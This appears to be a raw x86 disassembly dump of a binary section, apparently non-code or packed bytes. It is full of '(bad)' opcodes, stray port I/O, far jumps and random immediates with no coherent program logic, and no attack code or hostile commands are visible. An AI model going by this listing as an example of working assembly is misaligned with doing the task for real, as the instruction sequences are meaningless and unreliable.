  4134b7:	cmp    dh,BYTE PTR [eax+0x351ed6ed]
  4134bd:	call   FWORD PTR [ecx-0x25]
  4134c0:	sar    BYTE PTR [esi+0x6c],0xd5
  4134c4:	cmp    bl,ch
  4134c6:	mov    al,ds:0xace4fa5d
  4134cb:	push   edi
  4134cc:	lahf   
  4134cd:	mov    ebp,0x23d4503c
  4134d2:	imul   ecx,DWORD PTR [edx+0xceb30b3],0xdf367857
  4134dc:	sub    eax,DWORD PTR [ebx+0x46]
  4134df:	or     ebp,DWORD PTR [ebx+0x2c2f9e2d]
  4134e5:	iret   
  4134e6:	jnp    0x413505
  4134e8:	and    ch,ch
  4134ea:	jo     0x4134da
  4134ec:	(bad)  
  4134ed:	popa   
  4134ee:	adc    eax,0x6a8305e
  4134f3:	pop    edx
  4134f4:	pop    ds
  4134f5:	jne    0x413487
  4134f7:	jg     0x4134cc
  4134f9:	fistp  DWORD PTR [ecx-0x411f8bff]
  4134ff:	mov    edx,0xfa055a24
  413504:	push   ds
  413505:	rol    DWORD PTR [edx-0x4],1
  413508:	out    0xed,eax
  41350a:	and    DWORD PTR [ecx],esi
  41350c:	cwde   
  41350d:	fs sbb dh,al
  413510:	addr16 sbb al,0x90
  413513:	loope  0x41353b
  413515:	jmp    0x2865d12b
  41351a:	daa    
  41351b:	push   ebx
  41351c:	mov    bl,0xdf
  41351e:	xchg   edx,ecx
  413520:	ret    0x4071
  413523:	jle    0x4134c6
  413525:	int    0xdf
  413527:	add    eax,0x7948a8cf
  41352c:	sbb    eax,0x58fa46d2
  413531:	and    BYTE PTR [ecx+0x4851a1d4],0xa7
  413538:	sbb    eax,0x5a0ddbac
  41353d:	mov    cl,BYTE PTR [ebp+0x42526fc8]
  413543:	loop   0x41354f
  413545:	out    0xa6,eax
  413547:	dec    edx
  413548:	in     eax,0x20
  41354a:	sub    eax,0x19061407
  41354f:	dec    ecx
  413550:	shl    BYTE PTR [esi],1
  413552:	arpl   WORD PTR [ebx],di
  413554:	ret    0xcca5
  413557:	sub    ebp,DWORD PTR [ebp-0x36]
  41355a:	pushf  
  41355b:	adc    al,0x93
  41355d:	fldcw  WORD PTR [eax-0x423c6e9a]
  413563:	aam    0x5c
  413565:	jge    0x413578
  413567:	jle    0x413532
  413569:	mov    WORD PTR [edi],fs
  41356b:	mov    eax,0x61ed8107
  413570:	mov    gs,esi
  413572:	jb     0x413536
  413574:	aad    0x49
  413576:	add    bl,ch
  413578:	loop   0x41358e
  41357a:	pushf  
  41357b:	mov    fs,WORD PTR [edi-0x256e0f71]
  413581:	out    0x59,eax
  413583:	ss popa 
  413585:	add    edx,ebp
  413587:	pop    eax
  413588:	xchg   BYTE PTR [edx+0x4e0f20e],al
  41358e:	mov    ds:0xa04ed523,eax
  413593:	xchg   ebx,eax
  413594:	sub    al,0xae
  413596:	ja     0x4135d0
  413598:	pop    esi
  413599:	push   ds
  41359a:	push   es
  41359b:	sbb    dl,ah
  41359d:	fadd   DWORD PTR [ebx]
  41359f:	imul   edi,DWORD PTR [ecx-0x2b],0xffffffff
  4135a3:	mov    bl,BYTE PTR [edi+ecx*4-0x30]
  4135a7:	ret    
  4135a8:	dec    ecx
  4135a9:	mov    WORD PTR [ecx-0x7f],?
  4135ac:	icebp  
  4135ad:	xchg   ebx,eax
  4135ae:	pop    eax
  4135af:	imul   DWORD PTR [ebx]
  4135b1:	adc    al,ah
  4135b3:	or     cl,BYTE PTR [edx-0x19421d18]
  4135b9:	mov    al,0xcb
  4135bb:	(bad)  
  4135bc:	hlt    
  4135bd:	pop    eax
  4135be:	in     al,0xcd
  4135c0:	pop    edi
  4135c1:	or     BYTE PTR [ebx-0x10a3d010],bl
  4135c7:	jmp    0xc0a50f6e
  4135cc:	sbb    al,0x35
  4135ce:	sub    BYTE PTR [ebx-0x5b],cl
  4135d1:	arpl   WORD PTR [esi+0x5a708024],bp
  4135d7:	ss das 
  4135d9:	(bad)  
  4135da:	push   edi
  4135db:	xor    ecx,esi
  4135dd:	or     ebx,DWORD PTR [edx-0x2]
  4135e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135e1:	add    al,0x4
  4135e3:	ret    0x571
  4135e6:	xchg   DWORD PTR [edi-0x57],eax
  4135e9:	stos   DWORD PTR es:[edi],eax
  4135ea:	add    DWORD PTR [ebp+0x58],esp
  4135ed:	push   edi
  4135ee:	lea    esi,[esi-0x2ff34871]
  4135f4:	pushf  
  4135f5:	and    BYTE PTR [edi-0x74cdd9b9],al
  4135fb:	mov    ds:0x9e930ca,eax
  413600:	adc    al,0x28
  413602:	retf   
  413603:	pop    ecx
  413604:	add    dl,BYTE PTR [ecx-0x75]
  413607:	fs (bad) 
  413609:	and    bl,al
  41360b:	(bad)  
  41360c:	hlt    
  41360d:	sbb    al,0xcc
  41360f:	xor    DWORD PTR [edx+0x4278627],esp
  413615:	ins    BYTE PTR es:[edi],dx
  413616:	add    al,0x87
  413618:	or     al,BYTE PTR [ebx-0x4f]
  41361b:	or     cl,BYTE PTR [ecx-0x5bf7266e]
  413621:	pop    eax
  413622:	icebp  
  413623:	fwait
  413624:	and    eax,0xf0558cb5
  413629:	imul   esi,DWORD PTR [ebp-0x8e00326],0x67
  413630:	mov    eax,ds:0xd71d6ab
  413635:	daa    
  413636:	in     eax,0x97
  413638:	xchg   edi,eax
  413639:	pop    eax
  41363a:	xchg   edi,eax
  41363b:	mov    esp,0xcb65170b
  413640:	push   ebx
  413641:	cwde   
  413642:	sub    BYTE PTR [ebx-0x3d],al
  413645:	or     al,0x53
  413647:	and    edi,esp
  413649:	jecxz  0x4135f9
  41364b:	ja     0x413622
  41364d:	in     al,dx
  41364e:	xor    edx,DWORD PTR [edi+edi*1-0x76]
  413652:	aad    0xa0
  413654:	jo     0x41362d
  413656:	mov    bh,0x8f
  413658:	xchg   ecx,eax
  413659:	cmp    dh,BYTE PTR [edx]
  41365b:	mov    bh,0x2
  41365d:	and    eax,0xe34029fe
  413662:	in     eax,0xc3
  413664:	fwait
  413665:	push   es
  413666:	mov    dh,0x75
  413668:	ds xchg ebp,eax
  41366a:	xchg   esi,eax
  41366b:	push   edi
  41366c:	dec    esi
  41366d:	adc    eax,0x150dc8d2
  413672:	push   esi
  413673:	jmp    0x41367f
  413675:	sbb    al,0x67
  413677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413678:	in     eax,0xa3
  41367a:	xchg   edx,eax
  41367b:	std    
  41367c:	jg     0x41364e
  41367e:	fidivr DWORD PTR [ecx]
  413680:	retf   
  413681:	jg     0x41363a
  413683:	xor    al,0x36
  413685:	jge    0x4136d9
  413687:	mov    ds:0x8232a98a,eax
  41368c:	(bad)  
  41368d:	daa    
  41368e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41368f:	mul    BYTE PTR [ebx+0x3bbe23f7]
  413695:	inc    esi
  413696:	jns    0x413707
  413698:	or     BYTE PTR [eax-0x26],dl
  41369b:	retf   0x736d
  41369e:	stos   BYTE PTR es:[edi],al
  41369f:	add    BYTE PTR [ecx+0x53570a8d],ah
  4136a5:	mov    ecx,0x244de5e8
  4136aa:	sbb    al,0x89
  4136ac:	lods   eax,DWORD PTR ds:[esi]
  4136ad:	or     al,0xe5
  4136af:	sub    eax,0x8180c6fc
  4136b4:	(bad)  
  4136b5:	leave  
  4136b6:	dec    edi
  4136b7:	mov    dl,0x4c
  4136b9:	mov    eax,ds:0x9770c191
  4136be:	jmp    0x6d8:0xae8d9a76
  4136c5:	test   DWORD PTR [eax+0x528b44df],esi
  4136cb:	loop   0x413652
  4136cd:	mov    bl,0xaf
  4136cf:	sub    al,0x54
  4136d1:	ror    BYTE PTR [ebx-0x258f4b07],0xd5
  4136d8:	in     eax,0x28
  4136da:	ud2    
  4136dc:	mov    ds:0x3a1f8039,al
  4136e1:	pusha  
  4136e2:	add    bh,ah
  4136e4:	ja     0x4136ec
  4136e6:	test   al,0x1f
  4136e8:	scas   al,BYTE PTR es:[edi]
  4136e9:	aaa    
  4136ea:	cli    
  4136eb:	mov    dl,0x32
  4136ed:	inc    edx
  4136ee:	fscale 
  4136f0:	sub    eax,0x8db52f55
  4136f5:	jo     0x4136cf
  4136f7:	add    al,0x11
  4136f9:	mov    ch,0x61
  4136fb:	mov    eax,0x5651d256
  413700:	xchg   esp,eax
  413701:	jle    0x41368e
  413703:	loop   0x413732
  413705:	xor    DWORD PTR [ecx+0xb],eax
  413708:	dec    ebp
  413709:	repnz cmp edi,DWORD PTR [ecx]
  41370c:	jg     0x41369b
  41370e:	sbb    eax,0x640bb8f3
  413713:	repz vpmacssww xmm8,xmm2,XMMWORD PTR [ebx+eiz*4],xmm1
  41371b:	or     eax,0x90fa9dd5
  413720:	cmp    edx,eax
  413722:	inc    esp
  413723:	adc    bl,BYTE PTR [ebx+0x45499f9a]
  413729:	sub    al,0xee
  41372b:	sbb    ebx,DWORD PTR [ecx+edx*2]
  41372e:	or     al,0xcd
  413730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413731:	xor    eax,0xe7585826
  413736:	sbb    edi,ecx
  413738:	std    
  413739:	cmp    eax,0xdda91bcd
  41373e:	push   ebp
  41373f:	icebp  
  413740:	xor    al,0x11
  413742:	cmp    eax,0x9d9455f8
  413748:	(bad)  
  413749:	in     eax,0x52
  41374b:	push   DWORD PTR [edx+0x38cf4ac5]
  413751:	test   ax,0x6624
  413755:	xchg   BYTE PTR [esi-0x150ae669],dl
  41375b:	or     ch,BYTE PTR [edx]
  41375d:	fst    DWORD PTR [ecx-0x71]
  413760:	or     edi,ebp
  413762:	ins    DWORD PTR es:[edi],dx
  413763:	in     eax,dx
  413764:	(bad)  
  413766:	sub    edi,ebp
  413768:	mov    ebx,DWORD PTR [ecx+ebx*8+0x22]
  41376c:	fimul  DWORD PTR [ebx]
  41376e:	in     eax,dx
  41376f:	mov    ebx,0x795fd0fc
  413774:	cmp    ch,0xb5
  413777:	mov    ds:0xaaeef31c,al
  41377c:	pop    es
  41377d:	push   edx
  41377e:	push   ebp
  41377f:	xchg   ebp,eax
  413780:	fst    DWORD PTR [ecx]
  413782:	push   ebx
  413783:	xor    DWORD PTR [esi+0x4e],esi
  413786:	popa   
  413787:	fbld   TBYTE PTR [ebp+0x1f]
  41378a:	push   esp
  41378b:	scas   al,BYTE PTR es:[edi]
  41378c:	mov    dl,ah
  41378e:	sahf   
  41378f:	pop    ebx
  413790:	xchg   edx,eax
  413791:	mov    eax,0xf58a36f1
  413796:	call   0x50c8:0xfe88a7a3
  41379d:	int3   
  41379e:	popf   
  41379f:	cmp    al,0xbb
  4137a1:	xlat   BYTE PTR ds:[ebx]
  4137a2:	rol    BYTE PTR [eax],1
  4137a4:	add    DWORD PTR [eax+0x67cb64c0],esi
  4137aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ab:	push   0xffffff82
  4137ad:	pop    esi
  4137ae:	or     BYTE PTR [ebx],0xfa
  4137b1:	ret    
  4137b2:	lea    ebp,[esi-0x27]
  4137b5:	(bad)  
  4137b6:	aaa    
  4137b7:	fstp   QWORD PTR [edx+0x1b]
  4137ba:	retf   0xb854
  4137bd:	or     DWORD PTR [ebx-0x4060baf7],esi
  4137c3:	cmc    
  4137c4:	fnstcw WORD PTR [ecx-0x1a70ce29]
  4137ca:	aad    0x65
  4137cc:	mov    ebx,0x8c65859e
  4137d1:	(bad)  
  4137d2:	arpl   WORD PTR [esp+eax*8],bx
  4137d5:	fidivr DWORD PTR [ecx+edi*4-0x6ff87ac1]
  4137dc:	ds adc edi,0xffffff9a
  4137e0:	jb     0x41376e
  4137e2:	ja     0x413837
  4137e4:	jns    0x4137d8
  4137e6:	sub    bh,BYTE PTR [eax-0x38]
  4137e9:	mov    ch,0x4
  4137eb:	mov    esp,0x1cc27be7
  4137f0:	in     eax,0x6
  4137f2:	jnp    0x41380c
  4137f4:	imul   esi,DWORD PTR [edi-0x44],0xdfeae31c
  4137fb:	aam    0x75
  4137fd:	scas   eax,DWORD PTR es:[edi]
  4137fe:	pop    ss
  4137ff:	xchg   edi,eax
  413800:	jno    0x4137e4
  413802:	jae    0x413845
  413804:	jae    0x4137b2
  413806:	push   eax
  413807:	imul   esi,DWORD PTR [esi+edi*4-0x5a],0x9ac8b04f
  41380f:	inc    eax
  413810:	sub    DWORD PTR [esi+0x72fa1370],0x55
  413817:	nop
  413818:	outs   dx,BYTE PTR ds:[esi]
  413819:	and    bl,BYTE PTR [edi+edx*8-0x5c2a7baa]
  413820:	(bad)  
  413822:	or     DWORD PTR [edi-0x723f3b12],esp
  413828:	xchg   edx,eax
  413829:	sti    
  41382a:	jl     0x41381e
  41382c:	mov    dh,0xc8
  41382e:	(bad)  
  41382f:	aam    0x17
  413831:	or     eax,0xcd315a8c
  413836:	sub    DWORD PTR [esi+0x2],esp
  413839:	adc    DWORD PTR [edx-0x4a],esp
  41383c:	jle    0x413835
  41383e:	push   ebx
  41383f:	addr16 aad 0xb7
  413842:	test   eax,0xa667cd23
  413847:	jmp    FWORD PTR [edx+0x6f]
  41384a:	sub    BYTE PTR [ebp+0x3f5cb2dd],al
  413850:	jg     0x41386b
  413852:	shl    dl,0x6f
  413855:	dec    edx
  413856:	dec    ecx
  413857:	jnp    0x4137df
  413859:	enter  0x3282,0x28
  41385d:	sub    ebp,esi
  41385f:	pop    esp
  413860:	xchg   ebp,eax
  413861:	loope  0x413886
  413863:	ss mov ecx,0x9c5aa50c
  413869:	rcl    esi,0x8e
  41386c:	sbb    esp,edi
  41386e:	test   cl,al
  413870:	lds    ebx,FWORD PTR [ebp-0xf]
  413873:	repz out dx,eax
  413875:	arpl   WORD PTR [ebp+0x50143cf],sp
  41387b:	shr    BYTE PTR [ebp+ebx*1+0x46],1
  41387f:	mov    eax,0x20a090fc
  413884:	dec    ecx
  413885:	pop    edi
  413886:	(bad)  
  413888:	adc    al,0xc7
  41388a:	add    BYTE PTR [eax],dl
  41388c:	adc    eax,0x45d7b0cb
  413891:	adc    BYTE PTR [eax],bh
  413893:	inc    edx
  413894:	cmp    edx,DWORD PTR [esi-0x4d]
  413897:	into   
  413898:	ret    0xb032
  41389b:	pop    ebx
  41389c:	fbstp  TBYTE PTR [ebx+0x28]
  41389f:	stos   DWORD PTR es:[edi],eax
  4138a0:	jl     0x413882
  4138a2:	mov    ebx,0xd86a061d
  4138a7:	and    DWORD PTR [edx-0x5c],0x6a
  4138ab:	sub    DWORD PTR gs:[eax+0x78d0f293],esi
  4138b2:	call   FWORD PTR ds:0x536656b
  4138b8:	call   0x4317c6be
  4138bd:	dec    eax
  4138be:	test   BYTE PTR [esi-0x9fe02c3],bh
  4138c4:	dec    eax
  4138c5:	jmp    0x6a4:0xeecf7998
  4138cc:	pop    esp
  4138cd:	xor    bl,BYTE PTR [ecx*4+0x757a7f39]
  4138d4:	pop    ss
  4138d5:	shl    bl,0x92
  4138d8:	jecxz  0x413862
  4138da:	jp     0x413949
  4138dc:	jo     0x4138cc
  4138de:	mov    esp,0x5e4fe5c0
  4138e3:	jle    0x41392c
  4138e5:	(bad)  
  4138e6:	adc    eax,0x6a2c5344
  4138eb:	sbb    al,0xd4
  4138ed:	xchg   esi,eax
  4138ee:	inc    ebx
  4138ef:	xchg   ebx,eax
  4138f0:	(bad)  
  4138f1:	arpl   WORD PTR [eax],bx
  4138f3:	cwde   
  4138f4:	test   BYTE PTR [esi+0x6a1129f7],ah
  4138fa:	sub    DWORD PTR [edi],edx
  4138fc:	mov    ecx,0xfe68b616
  413901:	in     eax,dx
  413902:	or     ebx,DWORD PTR [edx]
  413904:	in     eax,0x27
  413906:	inc    ecx
  413907:	sub    bl,bh
  413909:	xchg   ebx,eax
  41390a:	sbb    eax,0xd3913095
  41390f:	xchg   edi,eax
  413910:	sub    BYTE PTR ds:0xdb2119de,ah
  413916:	inc    esp
  413917:	pop    ds
  413918:	sub    BYTE PTR [ecx-0x59899aac],0xf
  41391f:	out    0x37,eax
  413921:	jmp    0x1918:0x4e87014a
  413928:	cmp    eax,0x669935bf
  41392d:	jnp    0x41393b
  41392f:	(bad)  [esi-0x422a904f]
  413935:	xchg   BYTE PTR [edx],dh
  413937:	data16 cmp ch,BYTE PTR [eax-0x30]
  41393b:	jmp    0xd4c5:0x1c22638f
  413942:	sub    DWORD PTR [eax],0xffffffd6
  413945:	push   esi
  413946:	lds    edx,FWORD PTR [ecx-0x367f783d]
  41394c:	and    al,0x5
  41394e:	add    eax,DWORD PTR [edi]
  413950:	pusha  
  413951:	mul    eax
  413953:	in     eax,dx
  413954:	and    al,0x52
  413956:	popf   
  413957:	inc    esp
  413958:	sbb    eax,0x843b7a49
  41395d:	xor    BYTE PTR [esi+0x15c8ef1c],bl
  413963:	cli    
  413964:	add    edi,0xffffff9e
  413967:	fidivr DWORD PTR [edx+ecx*2]
  41396a:	outs   dx,DWORD PTR ds:[esi]
  41396b:	mov    BYTE PTR [edi-0x75],al
  41396e:	mov    eax,ds:0x93114f01
  413973:	shr    dh,cl
  413975:	pop    esi
  413976:	mov    eax,ds:0x997d0dbe
  41397b:	xchg   esi,eax
  41397c:	add    eax,0xe3f10547
  413981:	int    0xc0
  413983:	lea    esi,[ebx]
  413985:	enter  0x91e3,0xa4
  413989:	jecxz  0x4139f4
  41398b:	xchg   edi,eax
  41398c:	ret    0xf34b
  41398f:	mov    WORD PTR [ecx+0x76fe545d],gs
  413995:	jo     0x4139a1
  413997:	pop    es
  413998:	adc    DWORD PTR [ebp+0x5e332856],ebx
  41399e:	or     eax,0x20aa39fd
  4139a3:	mov    DWORD PTR [edi-0x193a71ed],eax
  4139a9:	cmp    ebp,DWORD PTR [eax+0x26]
  4139ac:	cli    
  4139ad:	mov    BYTE PTR [ebx],bl
  4139af:	jne    0x413956
  4139b1:	dec    ecx
  4139b2:	sti    
  4139b3:	std    
  4139b4:	push   ebp
  4139b5:	jbe    0x413974
  4139b7:	addr16 out dx,eax
  4139b9:	mov    al,0x5
  4139bb:	sbb    ecx,DWORD PTR [ebp+0x30]
  4139be:	enter  0xd7b6,0xcc
  4139c2:	rcr    ebp,cl
  4139c4:	ret    
  4139c5:	shl    DWORD PTR [eax+ecx*1],cl
  4139c8:	pop    edi
  4139c9:	jmp    0x4139f7
  4139cb:	in     al,dx
  4139cc:	enter  0x27c9,0x72
  4139d0:	(bad)  
  4139d1:	mov    edi,0xb2d0776d
  4139d6:	mov    ds:0x3e0d15bd,al
  4139db:	dec    esi
  4139dc:	ins    BYTE PTR es:[edi],dx
  4139dd:	push   eax
  4139de:	ror    bh,0x9a
  4139e1:	retf   
  4139e2:	jno    0x413a45
  4139e4:	push   ebp
  4139e5:	mov    ecx,0x7d4fa542
  4139ea:	out    dx,al
  4139eb:	pop    ecx
  4139ec:	xor    eax,0xdabd5cb9
  4139f1:	test   BYTE PTR [ebx+0x7b],0xd0
  4139f5:	test   BYTE PTR [edi],ch
  4139f7:	(bad)  
  4139f8:	xchg   edi,eax
  4139f9:	mov    bl,BYTE PTR [eax]
  4139fb:	pop    esi
  4139fc:	repnz test eax,0x118c105e
  413a02:	outs   dx,BYTE PTR ds:[esi]
  413a03:	ret    0xcb47
  413a06:	lahf   
  413a07:	int    0xc3
  413a09:	or     BYTE PTR [ebp+0x60d054ec],dl
  413a0f:	ror    BYTE PTR [ebp-0x33],cl
  413a12:	ja     0x413a45
  413a14:	popa   
  413a15:	out    dx,al
  413a16:	call   0xc694:0x3539f9d5
  413a1d:	mov    ecx,0x2f0af097
  413a22:	retf   0x6e57
  413a25:	xor    dh,BYTE PTR [ebx+edi*2+0x5]
  413a29:	fdiv   DWORD PTR [esi-0x22]
  413a2c:	call   0x3e26:0xc2ed1190
  413a33:	bound  ecx,QWORD PTR [ebx-0x4c]
  413a36:	pop    esi
  413a37:	push   esi
  413a38:	xor    al,0xce
  413a3a:	retf   
  413a3b:	outs   dx,BYTE PTR ds:[esi]
  413a3c:	aad    0x1
  413a3e:	fisubr WORD PTR ds:0x5d49d36c
  413a44:	popa   
  413a45:	packuswb mm5,QWORD PTR [eax+0x715aacd]
  413a4c:	mov    bl,bl
  413a4e:	(bad)  
  413a50:	xchg   sp,ax
  413a52:	retf   
  413a53:	xor    DWORD PTR [edx],0xd69023f9
  413a59:	aas    
  413a5a:	adc    ebp,ebx
  413a5c:	add    cl,bh
  413a5e:	adc    eax,esp
  413a60:	ror    cl,cl
  413a62:	stc    
  413a63:	aad    0x36
  413a65:	cmp    BYTE PTR [esi],0xa
  413a68:	mov    BYTE PTR [edi-0x60],ch
  413a6b:	jbe    0x413a46
  413a6d:	sar    eax,1
  413a6f:	mov    ebx,0x53defad6
  413a74:	mov    bh,0xad
  413a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a77:	dec    esp
  413a78:	add    edx,DWORD PTR [edi-0x51b6dad9]
  413a7e:	xchg   edi,eax
  413a7f:	push   es
  413a80:	div    al
  413a82:	cli    
  413a83:	rcr    ch,1
  413a85:	jae    0x413a17
  413a87:	scas   al,BYTE PTR es:[edi]
  413a88:	or     BYTE PTR [esi-0x5],bh
  413a8b:	sbb    bl,0x30
  413a8e:	test   eax,0xe32b89fa
  413a93:	push   ebp
  413a94:	xchg   DWORD PTR [ecx+edi*1],ebp
  413a97:	loopne 0x413ae1
  413a99:	call   0x582f:0xd3918acb
  413aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aa1:	cmc    
  413aa2:	cli    
  413aa3:	xor    eax,0x5727a3b0
  413aa8:	neg    esp
  413aaa:	pop    edx
  413aab:	sub    dh,BYTE PTR [ebp+0x374f1db6]
  413ab1:	ds (bad) 
  413ab3:	nop
  413ab4:	inc    esp
  413ab5:	inc    ebp
  413ab6:	adc    DWORD PTR [ebp+0x70f8e0ca],edx
  413abc:	(bad)  
  413abd:	xor    al,0xe9
  413abf:	mov    DWORD PTR [ebx-0x7f],esp
  413ac2:	mov    ds:0xad510ad6,al
  413ac7:	aaa    
  413ac8:	sub    edx,DWORD PTR [ecx]
  413aca:	inc    eax
  413acb:	mov    dl,0x9a
  413acd:	jl     0x413b24
  413acf:	dec    ebx
  413ad0:	aaa    
  413ad1:	jae    0x413b0f
  413ad3:	sub    BYTE PTR [edx-0x41],dl
  413ad6:	in     al,dx
  413ad7:	lock jno 0x413b35
  413ada:	add    DWORD PTR [edi-0x681135fb],edi
  413ae0:	and    ebx,DWORD PTR [esi]
  413ae2:	icebp  
  413ae3:	das    
  413ae4:	push   edx
  413ae5:	out    0x1c,eax
  413ae7:	and    BYTE PTR [edi-0x9c7f569],0x8e
  413aee:	std    
  413aef:	(bad)  
  413af0:	adc    al,0x51
  413af2:	in     al,0x5
  413af4:	mov    edx,0x126af222
  413af9:	stc    
  413afa:	cs into 
  413afc:	inc    ebp
  413afd:	mov    ecx,0x6f7cf9dd
  413b02:	es dec esi
  413b04:	mov    eax,ds:0xc8504323
  413b09:	mov    esi,0x82ef87ca
  413b0e:	or     ch,BYTE PTR [edx-0x236470bf]
  413b14:	mov    bh,0x37
  413b16:	bts    DWORD PTR [ebp+0x5d],0xc8
  413b1b:	outs   dx,BYTE PTR ds:[esi]
  413b1c:	or     eax,0xc1e3a6c3
  413b21:	ret    
  413b22:	aas    
  413b23:	es push ebp
  413b25:	xor    DWORD PTR [eax-0x76],esi
  413b28:	or     ebp,DWORD PTR [ecx+esi*4]
  413b2b:	add    ah,dh
  413b2d:	add    edx,DWORD PTR [ecx-0x4c]
  413b30:	cs mov bl,0x94
  413b33:	in     eax,0x2d
  413b35:	dec    ebp
  413b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b37:	cmp    ah,ch
  413b39:	mov    DWORD PTR [edx],ebp
  413b3b:	add    edi,DWORD PTR [eax+edx*8+0x7]
  413b3f:	mov    esi,0x4857fa33
  413b44:	dec    edi
  413b45:	adc    DWORD PTR [ebp+0x29],esp
  413b48:	mov    ah,0x82
  413b4a:	ror    dl,cl
  413b4c:	ins    DWORD PTR es:[edi],dx
  413b4d:	or     al,0xb3
  413b4f:	fdiv   QWORD PTR [eax]
  413b51:	and    eax,0xd7edead7
  413b56:	sub    DWORD PTR [ebp-0x542e8f02],0xffffff86
  413b5d:	mov    bl,0xef
  413b5f:	fstp   TBYTE PTR [ecx-0x21919d23]
  413b65:	mov    si,0xdaa2
  413b69:	loope  0x413bca
  413b6b:	xchg   esp,eax
  413b6c:	outs   dx,BYTE PTR ds:[esi]
  413b6d:	cmp    DWORD PTR [edi],ebp
  413b6f:	call   0x893d:0xf20942c2
  413b76:	xchg   edx,eax
  413b77:	dec    ebp
  413b78:	inc    esi
  413b79:	neg    eax
  413b7b:	icebp  
  413b7c:	mov    ecx,eax
  413b7e:	mov    DWORD PTR [edx],0x2d0eaed5
  413b84:	mov    BYTE PTR [edx-0x47159e94],bl
  413b8a:	xor    esp,DWORD PTR [edx+0x68]
  413b8d:	jns    0x413b46
  413b8f:	mov    dh,0x19
  413b91:	retf   
  413b92:	dec    eax
  413b93:	xor    edx,DWORD PTR [eax+0x51bc48f5]
  413b99:	xor    ebx,DWORD PTR [ebx-0x22]
  413b9c:	push   ss
  413b9d:	dec    BYTE PTR [ebp-0x33]
  413ba0:	sub    al,0x30
  413ba2:	xlat   BYTE PTR ds:[ebx]
  413ba3:	dec    ecx
  413ba4:	xor    DWORD PTR [ecx+0x8],ebx
  413ba7:	add    eax,0x3a831481
  413bac:	stc    
  413bad:	dec    esp
  413bae:	push   ds
  413baf:	int    0xbc
  413bb1:	jge    0x413b7e
  413bb3:	les    ebx,FWORD PTR [edi+edx*1-0x3e60aa16]
  413bba:	ret    
  413bbb:	xchg   ecx,eax
  413bbc:	xor    al,BYTE PTR [edx-0x16]
  413bbf:	sti    
  413bc0:	jne    0x413bec
  413bc2:	into   
  413bc3:	ficom  DWORD PTR [edx-0x81ffe45]
  413bc9:	in     eax,0x6b
  413bcb:	lock cmp ebx,DWORD PTR [ebx]
  413bce:	push   ecx
  413bcf:	jge    0x413c34
  413bd1:	cmovg  edx,DWORD PTR [eax+0x1a]
  413bd5:	sbb    bl,0x86
  413bd8:	stos   BYTE PTR es:[edi],al
  413bd9:	fadd   QWORD PTR [ecx+0x2da377a]
  413bdf:	mov    al,0x6f
  413be1:	xor    al,0x8d
  413be3:	pusha  
  413be4:	sbb    al,0xf
  413be6:	loopne 0x413b7a
  413be8:	push   0x2f
  413bea:	mov    dl,0x7
  413bec:	aam    0x55
  413bee:	jmp    0x413b72
  413bf0:	leave  
  413bf1:	clc    
  413bf2:	arpl   WORD PTR [edi-0x3c2443e9],dx
  413bf8:	jae    0x413c6a
  413bfa:	sbb    dl,BYTE PTR [ecx]
  413bfc:	in     eax,0xdd
  413bfe:	sub    DWORD PTR [ecx],0x84d9e416
  413c04:	ds mov esi,0x26684217
  413c0a:	push   DWORD PTR [di+0x72]
  413c0e:	lods   eax,DWORD PTR ds:[esi]
  413c0f:	outs   dx,DWORD PTR ds:[esi]
  413c10:	rol    DWORD PTR [ecx],0x3f
  413c13:	xchg   DWORD PTR [ebp+0x3327144e],eax
  413c19:	pop    esp
  413c1a:	jecxz  0x413c59
  413c1c:	scas   al,BYTE PTR es:[edi]
  413c1d:	mov    ah,0xee
  413c1f:	mov    eax,ds:0xd99cf4f5
  413c24:	jecxz  0x413c57
  413c26:	adc    DWORD PTR [eiz*2-0x7bccb548],edi
  413c2d:	adc    al,0x2c
  413c2f:	mov    db4,edi
  413c32:	enter  0x8185,0x17
  413c36:	shl    DWORD PTR [esi+0x6d],0x6c
  413c3a:	sub    bh,ch
  413c3c:	dec    edx
  413c3d:	inc    edi
  413c3e:	or     WORD PTR ds:0x714a19f2,ax
  413c45:	cmp    BYTE PTR [ebx],cl
  413c47:	(bad)  
  413c48:	ja     0x413c2b
  413c4a:	mov    al,ds:0x3d51c006
  413c4f:	retf   
  413c50:	lds    esi,FWORD PTR [ebp+0x3473d2e7]
  413c56:	ror    DWORD PTR [ebx+ecx*4+0x684008e8],1
  413c5d:	popa   
  413c5e:	sub    DWORD PTR [edi+0x75a04c65],0xffffffa2
  413c65:	jge    0x413c50
  413c67:	mov    ?,WORD PTR [edx]
  413c69:	pop    ss
  413c6a:	or     BYTE PTR [ebx+0x5d9d3871],0x18
  413c71:	bswap  eax
  413c73:	ret    0x2892
  413c76:	(bad)  
  413c77:	adc    al,0xef
  413c79:	sub    ah,BYTE PTR [ebp-0x56749aa]
  413c7f:	pop    edi
  413c80:	fld    DWORD PTR [ecx+0x551e5b7f]
  413c86:	and    BYTE PTR [esi-0x44],bh
  413c89:	jo     0x413c4f
  413c8b:	js     0x413c7f
  413c8d:	add    al,0x95
  413c8f:	(bad)  
  413c90:	mov    esp,0x78914b80
  413c95:	data16 jbe 0x413d11
  413c98:	sub    ah,0xb0
  413c9b:	mov    ecx,0xd3cbbf87
  413ca0:	nop
  413ca1:	ss cmp al,0xda
  413ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ca6:	mov    esi,0x95d2c8f6
  413cab:	pop    esp
  413cac:	pop    ebx
  413cad:	adc    bh,BYTE PTR [ecx+0x40]
  413cb0:	dec    eax
  413cb1:	or     al,0x2d
  413cb3:	ins    DWORD PTR es:[edi],dx
  413cb4:	jecxz  0x413d1b
  413cb6:	push   edx
  413cb7:	dec    ecx
  413cb8:	sahf   
  413cb9:	or     BYTE PTR [ecx],bh
  413cbb:	add    BYTE PTR [ebx],cl
  413cbd:	mov    ch,0x92
  413cbf:	ins    DWORD PTR es:[edi],dx
  413cc0:	lahf   
  413cc1:	and    al,0xf5
  413cc3:	sub    eax,0x74b88dc4
